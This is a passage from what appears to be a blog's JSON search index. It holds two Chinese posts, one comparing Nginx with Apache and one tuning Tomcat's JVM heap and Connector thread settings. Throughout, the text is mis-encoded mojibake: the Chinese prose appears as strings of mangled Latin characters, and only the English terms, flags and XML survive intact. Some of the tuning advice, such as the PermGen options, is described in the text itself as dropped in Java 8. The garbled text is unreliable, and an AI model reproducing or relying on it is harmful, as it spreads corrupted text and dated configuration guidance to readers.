¹æœ¬ç†ç”±,ä½†å¹¶ä¸æ˜¯æ‰€æœ‰çš„æƒ…å†µä¸‹éƒ½æ˜¯ epoll å¤§è·å…¨èƒœçš„,å¦‚æœæœ¬èº«æä¾›é™æ€æœåŠ¡çš„ å°±åªæœ‰å¯¥å¯¥å‡ ä¸ªæ–‡ä»¶,apache çš„ select æ¨¡å‹æˆ–è®¸æ¯” epoll æ›´é«˜æ€§èƒ½ã€‚å½“ç„¶,è¿™åªæ˜¯æ ¹æ® ç½‘ç»œ IO æ¨¡å‹çš„åŸç†ä½œçš„ä¸€ä¸ªå‡è®¾,çœŸæ­£çš„åº”ç”¨è¿˜æ˜¯éœ€è¦å®æµ‹äº†å†è¯´çš„ã€‚ 2ã€ä½œä¸º Web æœåŠ¡å™¨:ç›¸æ¯” Apache,Nginx ä½¿ç”¨æ›´å°‘çš„èµ„æº,æ”¯æŒæ›´å¤šçš„å¹¶å‘è¿æ¥, ä½“ç°æ›´é«˜çš„æ•ˆç‡,è¿™ç‚¹ä½¿ Nginx å°¤å…¶å—åˆ°è™šæ‹Ÿä¸»æœºæä¾›å•†çš„æ¬¢è¿ã€‚åœ¨é«˜è¿æ¥å¹¶å‘çš„æƒ…å†µä¸‹, Nginx æ˜¯ Apache æœåŠ¡å™¨ä¸é”™çš„æ›¿ä»£å“: Nginx åœ¨ç¾å›½æ˜¯åšè™šæ‹Ÿä¸»æœºç”Ÿæ„çš„è€æ¿ä»¬ç»å¸¸é€‰æ‹© çš„è½¯ä»¶å¹³å°ä¹‹ä¸€. èƒ½å¤Ÿæ”¯æŒé«˜è¾¾ 50,000 ä¸ªå¹¶å‘è¿æ¥æ•°çš„å“åº”, æ„Ÿè°¢ Nginx ä¸ºæˆ‘ä»¬é€‰æ‹©äº† epoll and kqueue ä½œä¸ºå¼€å‘æ¨¡å‹. Nginx ä½œä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡å™¨: Nginxæ—¢å¯ä»¥åœ¨å†…éƒ¨ç›´æ¥æ”¯æŒ Railså’ŒPHP ç¨‹åºå¯¹å¤–è¿›è¡Œ æœåŠ¡, ä¹Ÿå¯ä»¥æ”¯æŒä½œä¸º HTTP ä»£ç† æœåŠ¡å™¨å¯¹å¤–è¿›è¡ŒæœåŠ¡. Nginx é‡‡ç”¨ C è¿›è¡Œç¼–å†™, ä¸è®ºæ˜¯ ç³»ç»Ÿèµ„æºå¼€é”€è¿˜æ˜¯ CPU ä½¿ç”¨æ•ˆç‡éƒ½æ¯” Perlbal è¦å¥½å¾ˆå¤š. ä½œä¸ºé‚®ä»¶ä»£ç†æœåŠ¡å™¨: Nginx åŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªéå¸¸ä¼˜ç§€çš„é‚®ä»¶ä»£ç†æœåŠ¡å™¨(æœ€æ—©å¼€å‘è¿™ä¸ªäº§å“ çš„ç›®çš„ä¹‹ä¸€ä¹Ÿæ˜¯ä½œä¸ºé‚®ä»¶ä»£ç†æœåŠ¡å™¨), Last.fm æè¿°äº†æˆåŠŸå¹¶ä¸”ç¾å¦™çš„ä½¿ç”¨ç»éªŒ. Nginx æ˜¯ä¸€ä¸ªå®‰è£…éå¸¸çš„ç®€å• , é…ç½®æ–‡ä»¶éå¸¸ç®€æ´(è¿˜èƒ½å¤Ÿæ”¯æŒ perl è¯­æ³•),Bugséå¸¸å°‘çš„æœåŠ¡å™¨:Nginxå¯åŠ¨ç‰¹åˆ«å®¹æ˜“, å¹¶ä¸”å‡ ä¹å¯ä»¥åšåˆ°7*24ä¸é—´æ–­è¿è¡Œ,å³ä½¿è¿è¡Œæ•°ä¸ªæœˆ ä¹Ÿä¸éœ€è¦é‡æ–°å¯åŠ¨. ä½ è¿˜èƒ½å¤Ÿä¸é—´æ–­æœåŠ¡çš„æƒ…å†µä¸‹è¿›è¡Œè½¯ä»¶ç‰ˆæœ¬çš„å‡çº§ . Apache ä¸ Nginx çš„ä¼˜ç¼ºç‚¹æ¯”è¾ƒ 1ã€nginx ç›¸å¯¹äº apache çš„ä¼˜ç‚¹: è½»é‡çº§,åŒæ ·èµ· web æœåŠ¡,æ¯” apache å ç”¨æ›´å°‘çš„å†…å­˜åŠèµ„æºæŠ—å¹¶å‘,nginx å¤„ç†è¯·æ±‚æ˜¯å¼‚æ­¥éé˜»å¡çš„,è€Œ apache åˆ™æ˜¯é˜»å¡å‹çš„,åœ¨é«˜å¹¶å‘ä¸‹ Nginxèƒ½ä¿æŒä½èµ„æºä½æ¶ˆè€—é«˜æ€§èƒ½ é«˜åº¦æ¨¡å—åŒ–çš„è®¾è®¡,ç¼–å†™æ¨¡å—ç›¸å¯¹ç®€å• ç¤¾åŒºæ´»è·ƒ,å„ç§é«˜æ€§èƒ½æ¨¡å—å‡ºå“è¿…é€Ÿ 2ã€ apache ç›¸å¯¹äº nginx çš„ä¼˜ç‚¹: rewrite ,æ¯” nginx çš„ rewrite å¼ºå¤§ æ¨¡å—è¶…å¤š,åŸºæœ¬æƒ³åˆ°çš„éƒ½å¯ä»¥æ‰¾åˆ°å°‘ bug , nginx çš„ bug ç›¸å¯¹è¾ƒå¤š (ç°åœ¨ bug æ–¹é¢åº”è¯¥æ²¡å¤šå¤§åŒºåˆ«) è¶…ç¨³å®š 3ã€Nginx é…ç½®ç®€æ´, Apache å¤æ‚ Nginx é™æ€å¤„ç†æ€§èƒ½æ¯” Apache é«˜ 3 å€ä»¥ä¸Š Apache å¯¹ PHP æ”¯æŒæ¯”è¾ƒç®€å•,Nginx éœ€è¦é…åˆå…¶ä»–åç«¯ç”¨ Apache çš„ç»„ä»¶æ¯” Nginx å¤šç°åœ¨ Nginx æ‰æ˜¯ Web æœåŠ¡å™¨çš„é¦–é€‰ 4ã€æœ€æ ¸å¿ƒçš„åŒºåˆ«åœ¨äº apache æ˜¯åŒæ­¥å¤šè¿›ç¨‹æ¨¡å‹,ä¸€ä¸ªè¿æ¥å¯¹åº”ä¸€ä¸ªè¿›ç¨‹;nginx æ˜¯å¼‚æ­¥ çš„,å¤šä¸ªè¿æ¥(ä¸‡çº§åˆ«)å¯ä»¥å¯¹åº”ä¸€ä¸ªè¿›ç¨‹ 5ã€nginx å¤„ç†é™æ€æ–‡ä»¶å¥½,è€—è´¹å†…å­˜å°‘.ä½†æ— ç–‘ apache ä»ç„¶æ˜¯ç›®å‰çš„ä¸»æµ,æœ‰å¾ˆå¤šä¸°å¯Œçš„ç‰¹ æ€§.æ‰€ä»¥è¿˜éœ€è¦æ­é…ç€æ¥.å½“ç„¶å¦‚æœèƒ½ç¡®å®š nginx å°±é€‚åˆéœ€æ±‚,é‚£ä¹ˆä½¿ç”¨ nginx ä¼šæ˜¯æ›´ç»æµçš„æ–¹ å¼. 6ã€ä»ä¸ªäººè¿‡å¾€çš„ä½¿ç”¨æƒ…å†µæ¥çœ‹,nginx çš„è´Ÿè½½èƒ½åŠ›æ¯” apache é«˜å¾ˆå¤šã€‚æœ€æ–°çš„æœåŠ¡å™¨ä¹Ÿæ”¹ ç”¨ nginx äº†ã€‚è€Œä¸” nginx æ”¹å®Œé…ç½®èƒ½-t æµ‹è¯•ä¸€ä¸‹é…ç½®æœ‰æ²¡æœ‰é—®é¢˜,apache é‡å¯çš„æ—¶å€™å‘ç° é…ç½®å‡ºé”™äº†,ä¼šå¾ˆå´©æºƒ,æ”¹çš„æ—¶å€™éƒ½ä¼šéå¸¸å°å¿ƒç¿¼ç¿¼ç°åœ¨çœ‹æœ‰å¥½å¤šé›†ç¾¤ç«™,å‰ç«¯ nginx æŠ— å¹¶å‘,åç«¯ apache é›†ç¾¤,é…åˆçš„ä¹Ÿä¸é”™ã€‚ 7ã€nginx å¤„ç†åŠ¨æ€è¯·æ±‚æ˜¯æ¯”è¾ƒå¼±,ä¸€èˆ¬åŠ¨æ€è¯·æ±‚è¦ apache å»åš,nginx åªé€‚åˆé™æ€å’Œå å‘ã€‚8ã€nginx æ˜¯å¾ˆä¸éŒ¯çš„å‰ç«¯æœåŠ¡å™¨,è´Ÿè½½æ€§èƒ½å¾ˆå¥½, apache å¯¹ php ç­‰è¯­è¨€çš„æ”¯æŒå¾ˆå¥½,æ­¤å¤– apache æœ‰å¼ºå¤§çš„æ”¯æŒç½‘è·¯,å‘å±•æ—¶é—´ç›¸å¯¹ nginx æ›´ä¹…,bug å°‘ä½†æ˜¯ apache æœ‰å…ˆå¤©ä¸ æ”¯æŒå¤šæ ¸å¿ƒå¤„ç†è´Ÿè½½çš„ç¼ºç‚¹,å»ºè®®ä½¿ç”¨ nginx åšå‰ç«¯,åç«¯ç”¨ apacheã€‚å¤§å‹ç½‘ç«™å»ºè®®ç”¨ nginx è‡ªä»£çš„é›†ç¾¤åŠŸèƒ½.9ã€Nginx ä¼˜äº apache çš„ä¸»è¦ä¸¤ç‚¹: 1.Nginx æœ¬èº«å°±æ˜¯ä¸€ä¸ªåå‘ä»£ç†æœåŠ¡å™¨ 2.Nginx æ”¯æŒ 7 å±‚è´Ÿè½½å‡è¡¡;å…¶ä»–çš„å½“ç„¶,Nginx å¯èƒ½ä¼šæ¯” apache æ”¯æŒæ›´é«˜çš„å¹¶å‘ã€‚ 10ã€ä½ å¯¹ web server çš„éœ€æ±‚å†³å®šä½ çš„é€‰æ‹©ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ nginx éƒ½ä¼˜äº APACHE,æ¯”å¦‚ è¯´é™æ€æ–‡ä»¶å¤„ç†ã€PHP-CGI çš„æ”¯æŒã€åå‘ä»£ç†åŠŸèƒ½ã€å‰ç«¯ Cacheã€ç»´æŒè¿æ¥ç­‰ç­‰ã€‚åœ¨ Apache+PHP(prefork)æ¨¡å¼ä¸‹,å¦‚æœ PHP å¤„ç†æ…¢æˆ–è€…å‰ç«¯å‹åŠ›å¾ˆå¤§çš„æƒ…å†µä¸‹,å¾ˆå®¹æ˜“ å‡ºç° Apache è¿›ç¨‹æ•°é£™å‡,ä»è€Œæ‹’ç»æœåŠ¡çš„ç°è±¡ã€‚ 11ã€å¯ä»¥çœ‹ä¸€ä¸‹ nginx lua æ¨¡å—:https://github.com/ chaoslawâ€¦apache æ¯” nginx å¤šçš„ æ¨¡å—,å¯ç›´æ¥ç”¨ lua å®ç° apache æ˜¯æœ€æµè¡Œçš„,why?å¤§å¤šæ•°äººæ‡’å¾—æ›´æ–°åˆ° nginx æˆ–è€…å­¦æ–°äº‹ç‰© 12ã€å¯¹äº nginx,æˆ‘å–œæ¬¢å®ƒé…ç½®æ–‡ä»¶å†™çš„å¾ˆç®€æ´,æ­£åˆ™é…ç½®è®©å¾ˆå¤šäº‹æƒ…å˜å¾—ç®€å•è¿è¡Œæ•ˆç‡ é«˜,å ç”¨èµ„æºå°‘,ä»£ç†åŠŸèƒ½å¼ºå¤§,å¾ˆé€‚åˆåšå‰ç«¯å“åº”æœåŠ¡å™¨ 13ã€Apache åœ¨å¤„ç†åŠ¨æ€æœ‰ä¼˜åŠ¿,Nginx å¹¶å‘æ€§æ¯”è¾ƒå¥½,CPU å†…å­˜å ç”¨ä½,å¦‚æœ rewrite é¢‘ç¹,é‚£è¿˜æ˜¯Apacheå§","link":"/2016/03/26/WebæœåŠ¡æŠ€æœ¯/Nginx/ Nginx å’Œ apache å¯¹æ¯” /"},{"title":"è®°ä¸€æ¬¡çº¿ä¸Štomcatå†…å­˜ä¸è¶³é…ç½®å¹¶å‘ä¼˜åŒ–è¿‡ç¨‹","text":"å‰è¨€ï¼štomcatçš„å†…å­˜ä½¿ç”¨é…ç½®,æœ€å¤§è¿æ¥æ•°é…ç½®ã€‚å¦‚ä½•ä¿®æ”¹é…ç½®å‘¢ï¼Œåœ¨/tomcatçš„/bin/ä¸‹é¢æœ‰ä¸ªè¿™ä¸ªè„šæœ¬æ–‡ä»¶ã€‚catailna.sh è„šæœ¬æ–‡ä»¶ã€‚ å¦‚æœwindows æ˜¯batè®¾ç½®tomcatçš„ä½¿ç”¨å†…å­˜ï¼Œä¹Ÿå…¶å®å°±æ˜¯è®¾ç½®jimçš„ä½¿ç”¨å‚æ•°ã€‚ è®¾ç½®Tomcatå¯åŠ¨çš„åˆå§‹å†…å­˜å…¶åˆå§‹ç©ºé—´(å³-Xms)æ˜¯ç‰©ç†å†…å­˜çš„1/64ï¼Œæœ€å¤§ç©ºé—´(-Xmx)æ˜¯ç‰©ç†å†…å­˜çš„1/4ã€‚å¯ä»¥åˆ©ç”¨JVMæä¾›çš„-Xmn -Xms -Xmxç­‰é€‰é¡¹å¯ è¦åŠ â€œmâ€è¯´æ˜æ˜¯MBï¼Œå¦åˆ™å°±æ˜¯KBäº†ï¼Œåœ¨å¯åŠ¨tomcatæ—¶ä¼š æŠ¥å†…å­˜ä¸è¶³ã€‚ 123-Xmsï¼šåˆå§‹å€¼ ã€åˆå§‹åŒ–å†…å­˜å¤§å°ã€‘-Xmxï¼šæœ€å¤§å€¼ ã€å¯ä»¥ä½¿ç”¨çš„æœ€å¤§å†…å­˜ã€‘-Xmnï¼šæœ€å°å€¼ JVMå †çš„è®¾ç½®æ˜¯æŒ‡javaç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­JVMå¯ä»¥è°ƒé…ä½¿ç”¨çš„å†…å­˜ç©ºé—´çš„è®¾ç½®.JVMåœ¨å¯åŠ¨çš„æ—¶å€™ä¼šè‡ªåŠ¨è®¾ç½®Heap sizeçš„å€¼ï¼Œå…¶åˆå§‹ç©ºé—´(å³-Xms)æ˜¯ç‰©ç†å†…å­˜çš„1/64ï¼Œæœ€å¤§ç©ºé—´(-Xmx)æ˜¯ç‰©ç†å†…å­˜çš„1/4ã€‚å¯ä»¥åˆ©ç”¨JVMæä¾›çš„-Xmn -Xms -Xmxç­‰é€‰é¡¹å¯è¿›è¡Œè®¾ç½®ã€‚Heap size çš„å¤§å°æ˜¯Young Generation å’ŒTenured Generaion ä¹‹å’Œã€‚ æç¤ºï¼šåœ¨JVMä¸­å¦‚æœ98ï¼…çš„æ—¶é—´æ˜¯ç”¨äºGCä¸”å¯ç”¨çš„Heap size ä¸è¶³2ï¼…çš„æ—¶å€™å°†æŠ›å‡ºæ­¤å¼‚å¸¸ä¿¡æ¯. æç¤ºï¼šHeap Size æœ€å¤§ä¸è¦è¶…è¿‡å¯ç”¨ç‰©ç†å†…å­˜çš„80ï¼…ï¼Œä¸€èˆ¬çš„è¦å°†-Xmså’Œ-Xmxé€‰é¡¹è®¾ç½®ä¸ºç›¸åŒï¼Œè€Œ-Xmnä¸º1/4çš„-Xmxå€¼ã€‚ è¿™ä¸¤ä¸ªå€¼çš„å¤§å°ä¸€èˆ¬æ ¹æ®éœ€è¦è¿›è¡Œè®¾ç½®ã€‚åˆå§‹åŒ–å †çš„å¤§å°æ‰§è¡Œäº†è™šæ‹Ÿæœºåœ¨å¯åŠ¨æ—¶å‘ç³»ç»Ÿç”³è¯·çš„å†…å­˜çš„å¤§å°ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œè¿™ä¸ªå‚æ•°ä¸é‡è¦ã€‚ä½†æ˜¯æœ‰çš„åº”ç”¨ ç¨‹åºåœ¨å¤§è´Ÿè½½çš„æƒ…å†µä¸‹ä¼šæ€¥å‰§åœ°å ç”¨æ›´å¤šçš„å†…å­˜ï¼Œæ­¤æ—¶è¿™ä¸ªå‚æ•°å°±æ˜¯æ˜¾å¾—éå¸¸é‡è¦ï¼Œå¦‚æœè™šæ‹Ÿæœºå¯åŠ¨æ—¶è®¾ç½®ä½¿ç”¨çš„å†…å­˜æ¯”è¾ƒå°è€Œåœ¨è¿™ç§æƒ…å†µä¸‹æœ‰è®¸å¤šå¯¹è±¡è¿›è¡Œåˆå§‹ åŒ–ï¼Œè™šæ‹Ÿæœºå°±å¿…é¡»é‡å¤åœ°å¢åŠ å†…å­˜æ¥æ»¡è¶³ä½¿ç”¨ã€‚ç”±äºè¿™ç§åŸå› ï¼Œæˆ‘ä»¬ä¸€èˆ¬æŠŠ-Xmså’Œ-Xmxè®¾ä¸ºä¸€æ ·å¤§ï¼Œè€Œå †çš„æœ€å¤§å€¼å—é™äºç³»ç»Ÿä½¿ç”¨çš„ç‰©ç†å†…å­˜ã€‚ä¸€èˆ¬ä½¿ç”¨æ•° æ®é‡è¾ƒå¤§çš„åº”ç”¨ç¨‹åºä¼šä½¿ç”¨æŒä¹…å¯¹è±¡ï¼Œå†…å­˜ä½¿ç”¨æœ‰å¯èƒ½è¿…é€Ÿåœ°å¢é•¿ã€‚å½“åº”ç”¨ç¨‹åºéœ€è¦çš„å†…å­˜è¶…å‡ºå †çš„æœ€å¤§å€¼æ—¶è™šæ‹Ÿæœºå°±ä¼šæç¤ºå†…å­˜æº¢å‡ºï¼Œå¹¶ä¸”å¯¼è‡´åº”ç”¨æœåŠ¡å´©æºƒã€‚å›  æ­¤ä¸€èˆ¬å»ºè®®å †çš„æœ€å¤§å€¼è®¾ç½®ä¸ºå¯ç”¨å†…å­˜çš„æœ€å¤§å€¼çš„80%ã€‚ å¦‚æœç³»ç»ŸèŠ±è´¹å¾ˆå¤šçš„æ—¶é—´æ”¶é›†åƒåœ¾ï¼Œè¯·å‡å°å †å¤§å°ã€‚ä¸€æ¬¡å®Œå…¨çš„åƒåœ¾æ”¶é›†åº”è¯¥ä¸è¶…è¿‡ 3-5 ç§’ã€‚å¦‚æœåƒåœ¾æ”¶é›†æˆä¸ºç“¶é¢ˆï¼Œé‚£ä¹ˆéœ€è¦æŒ‡å®šä»£çš„å¤§å°ï¼Œæ£€æŸ¥åƒåœ¾æ”¶é›†çš„è¯¦ç»†è¾“å‡ºï¼Œç ”ç©¶ åƒåœ¾æ”¶é›†å‚æ•°å¯¹æ€§èƒ½çš„å½±å“ã€‚ä¸€èˆ¬è¯´æ¥ï¼Œä½ åº”è¯¥ä½¿ç”¨ç‰©ç†å†…å­˜çš„ 80% ä½œä¸ºå †å¤§å°ã€‚å½“å¢åŠ å¤„ç†å™¨æ—¶ï¼Œè®°å¾—å¢åŠ å†…å­˜ï¼Œå› ä¸ºåˆ†é…å¯ä»¥å¹¶è¡Œè¿›è¡Œï¼Œè€Œåƒåœ¾æ”¶é›†ä¸æ˜¯å¹¶è¡Œçš„ã€‚åœ¨é‡å¯ä½ çš„TomcatæœåŠ¡å™¨ä¹‹åï¼Œè¿™äº›é…ç½®çš„æ›´æ”¹æ‰ä¼šæœ‰æ•ˆã€‚ 1Windowsä¸‹ï¼Œåœ¨æ–‡ä»¶&#123;tomcat_home&#125;/bin/catalina.batï¼ŒUnixä¸‹ï¼Œåœ¨æ–‡ä»¶&#123;tomcat_home&#125;/bin/catalina.shçš„å‰é¢ï¼Œå¢åŠ å¦‚ä¸‹è®¾ç½®ï¼š Tomcatå†…å­˜ä¼˜åŒ–Tomcatå†…å­˜ä¼˜åŒ–ä¸»è¦æ˜¯å¯¹ tomcat å¯åŠ¨å‚æ•°ä¼˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ tomcat çš„å¯åŠ¨è„šæœ¬ catalina.sh ä¸­è®¾ç½®JAVA_OPTS å‚æ•°ã€‚ 1234567891.JAVA_OPTSå‚æ•°è¯´æ˜Javaä»£ç  -server å¯ç”¨jdk çš„ server ç‰ˆï¼› -Xms javaè™šæ‹Ÿæœºåˆå§‹åŒ–æ—¶çš„æœ€å°å†…å­˜ï¼› -Xmx javaè™šæ‹Ÿæœºå¯ä½¿ç”¨çš„æœ€å¤§å†…å­˜ï¼› -XX:PermSize å†…å­˜æ°¸ä¹…ä¿ç•™åŒºåŸŸ -XX:MaxPermSize å†…å­˜æœ€å¤§æ°¸ä¹…ä¿ç•™åŒºåŸŸ æœåŠ¡å™¨å‚æ•°é…ç½®12345678 tomcaté»˜è®¤ï¼š -Xms1024m -Xmx1024m -Xss1024K -XX:PermSize=128m -XX:MaxPermSize=256mJavaä»£ç  JAVA_OPTS=\"-Djava.awt.headless=true -Dfile.encoding=UTF-8 -server -Xms2048m -Xmx2048m -XX:NewSize=512m -XX:MaxNewSize=512m -XX:PermSize=512m -XX:MaxPermSize=512m -XX:+DisableExplicitGC\" é…ç½®å®Œæˆåå¯é‡å¯Tomcat ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡ŒæŸ¥çœ‹é…ç½®æ˜¯å¦ç”Ÿæ•ˆï¼š é¦–å…ˆæŸ¥çœ‹Tomcatè¿›ç¨‹å·ï¼š1ps -ef | grep tomcat æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Tomcat è¿›ç¨‹å·æ˜¯ 32179 ã€‚ å®è·µä¾‹å­ï¼š å…ˆæŸ¥çœ‹æ²¡æœ‰ä¼˜åŒ–tomcatå†…å­˜å‰ï¼š 1sudo jmap â€“ heap 32179 æŸ¥çœ‹æ˜¯å¦é…ç½®ç”Ÿæ•ˆï¼š123Xmlä»£ç sudo jmap â€“ heap 32179 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°MaxHeapSize ç­‰å‚æ•°å·²ç»ç”Ÿæ•ˆã€‚ æç¤ºï¼šå¦‚æœjdk1.8 å¯åŠ¨æœåŠ¡ä¼šæœ‰è­¦å‘Šâš ï¸ Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=512m; support was removed in 8.0 Tomcatå¹¶å‘ä¼˜åŒ–1.Tomcatè¿æ¥ç›¸å…³å‚æ•° åœ¨Tomcat é…ç½®æ–‡ä»¶confä¸‹é¢ server.xml ä¸­çš„ é…ç½®ä¸­ åœ¨tomcaté…ç½®æ–‡ä»¶server.xmlä¸­çš„é…ç½®ä¸­ï¼Œå’Œè¿æ¥æ•°ç›¸å…³çš„å‚æ•°æœ‰ï¼š minProcessorsï¼šæœ€å°ç©ºé—²è¿æ¥çº¿ç¨‹æ•°ï¼Œç”¨äºæé«˜ç³»ç»Ÿå¤„ç†æ€§èƒ½ï¼Œé»˜è®¤å€¼ä¸º10maxProcessorsï¼šæœ€å¤§è¿æ¥çº¿ç¨‹æ•°ï¼Œå³ï¼šå¹¶å‘å¤„ç†çš„æœ€å¤§è¯·æ±‚æ•°ï¼Œé»˜è®¤å€¼ä¸º75acceptCountï¼šå…è®¸çš„æœ€å¤§è¿æ¥æ•°ï¼Œåº”å¤§äºç­‰äºmaxProcessorsï¼Œé»˜è®¤å€¼ä¸º100enableLookupsï¼šæ˜¯å¦åæŸ¥åŸŸåï¼Œå–å€¼ä¸ºï¼štrueæˆ–falseã€‚ä¸ºäº†æé«˜å¤„ç†èƒ½åŠ›ï¼Œåº”è®¾ç½®ä¸ºfalseconnectionTimeoutï¼šç½‘ç»œè¿æ¥è¶…æ—¶ï¼Œå•ä½ï¼šæ¯«ç§’ã€‚è®¾ç½®ä¸º0è¡¨ç¤ºæ°¸ä¸è¶…æ—¶ï¼Œè¿™æ ·è®¾ç½®æœ‰éšæ‚£çš„ã€‚é€šå¸¸å¯è®¾ç½®ä¸º30000æ¯«ç§’ã€‚ å‚æ•°è¯´æ˜12345678910111213141516171819202122232425262728é»˜è®¤çš„tomcat å‚æ•°ï¼š &lt;Connector port=â€œ8080\" protocol=\"HTTP/1.1\" connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt;ä¿®æ”¹ï¼š &lt;Connector port=â€œ8080\" protocol=\"HTTP/1.1\" maxThreads=\"600\" minSpareThreads=\"100\" maxSpareThreads=\"500\" acceptCount=\"700\" connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt;``` è¿™æ ·è®¾ç½®ä»¥åï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰å†å½“æœºè¿‡ã€‚``` bash maxThreads=â€œ600\" è¡¨ç¤ºæœ€å¤šåŒæ—¶å¤„ç†600ä¸ªè¿æ¥ ///æœ€å¤§çº¿ç¨‹æ•° minSpareThreads=â€œ100\" è¡¨ç¤ºå³ä½¿æ²¡æœ‰äººä½¿ç”¨ä¹Ÿå¼€è¿™ä¹ˆå¤šç©ºçº¿ç¨‹ç­‰å¾… ///åˆå§‹åŒ–æ—¶åˆ›å»ºçš„çº¿ç¨‹æ•° maxSpareThreads=â€œ500\" è¡¨ç¤ºå¦‚æœæœ€å¤šå¯ä»¥ç©º500ä¸ªçº¿ç¨‹ï¼Œä¾‹å¦‚æŸæ—¶åˆ»æœ‰505äººè®¿é—®ï¼Œä¹‹åæ²¡æœ‰äººè®¿é—®äº†ï¼Œåˆ™tomcatä¸ä¼šä¿ç•™505ä¸ªç©ºçº¿ç¨‹ï¼Œè€Œæ˜¯å…³é—­505ä¸ªç©ºçš„ã€‚ ///ä¸€æ—¦åˆ›å»ºçš„çº¿ç¨‹è¶…è¿‡è¿™ä¸ªå€¼ï¼ŒTomcatå°±ä¼šå…³é—­ä¸å†éœ€è¦çš„socketçº¿ç¨‹ã€‚ acceptCount=\"700\"//æŒ‡å®šå½“æ‰€æœ‰å¯ä»¥ä½¿ç”¨çš„å¤„ç†è¯·æ±‚çš„çº¿ç¨‹æ•°éƒ½è¢«ä½¿ç”¨æ—¶ï¼Œå¯ä»¥æ”¾åˆ°å¤„ç†é˜Ÿåˆ—ä¸­çš„è¯·æ±‚æ•°ï¼Œè¶…è¿‡è¿™ä¸ªæ•°çš„è¯·æ±‚å°†ä¸äºˆå¤„ç†è¿™é‡Œæ˜¯http connectorçš„ä¼˜åŒ–ï¼Œå¦‚æœä½¿ç”¨apacheå’Œtomcatåšé›†ç¾¤çš„è´Ÿè½½å‡è¡¡ï¼Œå¹¶ä¸”ä½¿ç”¨ajpåè®®åšapacheå’Œtomcatçš„åè®®è½¬å‘ï¼Œé‚£ä¹ˆè¿˜éœ€è¦ä¼˜åŒ–ajp connectorã€‚ &lt;Connector port=\"8009\" protocol=\"AJP/1.3\" maxThreads=\"600\" minSpareThreads=\"100\" maxSpareThreads=\"500\" acceptCount=\"700\"connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt; æŠ¥é”™errorTomcatçš„JVMæç¤ºå†…å­˜æº¢å‡º1æŸ¥çœ‹%TOMCAT_HOME%\\logsæ–‡ä»¶å¤¹ä¸‹ï¼Œæ—¥å¿—æ–‡ä»¶æ˜¯å¦æœ‰å†…å­˜æº¢å‡ºé”™è¯¯ ä¿®æ”¹Tomcatçš„JVM11ã€é”™è¯¯æç¤ºï¼šjava.lang.OutOfMemoryError: Java heap space Tomcaté»˜è®¤å¯ä»¥ä½¿ç”¨çš„å†…å­˜ä¸º128MBï¼Œåœ¨è¾ƒå¤§å‹çš„åº”ç”¨é¡¹ç›®ä¸­ï¼Œè¿™ç‚¹å†…å­˜æ˜¯ä¸å¤Ÿçš„ï¼Œæœ‰å¯èƒ½å¯¼è‡´ç³»ç»Ÿæ— æ³•è¿è¡Œã€‚å¸¸è§çš„é—®é¢˜æ˜¯æŠ¥Tomcatå†…å­˜æº¢å‡ºé”™è¯¯ï¼ŒOut of Memory(ç³»ç»Ÿå†…å­˜ä¸è¶³)çš„å¼‚å¸¸ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯æ˜¾ç¤º500é”™è¯¯ï¼Œä¸€èˆ¬è°ƒæ•´Tomcatçš„ä½¿ç”¨å†…å­˜å³å¯è§£å†³æ­¤é—®é¢˜ã€‚ 12windowsç¯å¢ƒä¸‹ä¿®æ”¹ â€œ%TOMCAT_HOME%\\bin\\catalina.batâ€æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¼€å¤´å¢åŠ å¦‚ä¸‹è®¾ç½®ï¼šJAVA_OPTS=-Xms2048m -Xmx2048m Linuxç¯å¢ƒä¸‹ä¿®æ”¹12 â€œ%TOMCAT_HOME%\\bin\\catalina.shâ€æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¼€å¤´å¢åŠ å¦‚ä¸‹è®¾ç½®ï¼šJAVA_OPTS=-Xms2048m -Xmx2048må…¶ä¸­ï¼Œ-Xmsè®¾ç½®åˆå§‹åŒ–å†…å­˜å¤§å°ï¼Œ-Xmxè®¾ç½®å¯ä»¥ä½¿ç”¨çš„æœ€å¤§å†…å­˜ã€‚ è·Ÿæˆ‘ä¸Šé¢é‚£ä¹ˆè®¾ç½®å°±å¯ä»¥äº†ã€‚ 2.é”™è¯¯æç¤ºï¼šjava.lang.OutOfMemoryError: PermGen space åŸå› ï¼š 12 PermGen spaceçš„å…¨ç§°æ˜¯Permanent Generation space,æ˜¯æŒ‡å†…å­˜çš„æ°¸ä¹…ä¿å­˜åŒºåŸŸï¼Œè¿™å—å†…å­˜ä¸»è¦æ˜¯è¢«JVMå­˜æ”¾Classå’ŒMetaä¿¡æ¯çš„,Classåœ¨è¢«Loaderæ—¶å°±ä¼šè¢«æ”¾åˆ°PermGen spaceä¸­ï¼Œå®ƒå’Œå­˜æ”¾ç±»å®ä¾‹(Instance)çš„HeapåŒºåŸŸä¸åŒ,GC(Garbage Collection)ä¸ä¼šåœ¨ä¸»ç¨‹åºè¿è¡ŒæœŸå¯¹PermGen spaceè¿›è¡Œæ¸…ç†ï¼Œæ‰€ä»¥å¦‚æœä½ çš„åº”ç”¨ä¸­æœ‰å¾ˆCLASSçš„è¯,å°±å¾ˆå¯èƒ½å‡ºç°PermGen spaceé”™è¯¯ï¼Œè¿™ç§é”™è¯¯å¸¸è§åœ¨webæœåŠ¡å™¨å¯¹JSPè¿›è¡Œpre compileçš„æ—¶å€™ã€‚å¦‚æœä½ çš„WEB APPä¸‹éƒ½ç”¨äº†å¤§é‡çš„ç¬¬ä¸‰æ–¹jar, å…¶å¤§å°è¶…è¿‡äº†jvmé»˜è®¤çš„å¤§å°(4M)é‚£ä¹ˆå°±ä¼šäº§ç”Ÿæ­¤é”™è¯¯ä¿¡æ¯äº†ã€‚ è§£å†³æ–¹æ³•ï¼š 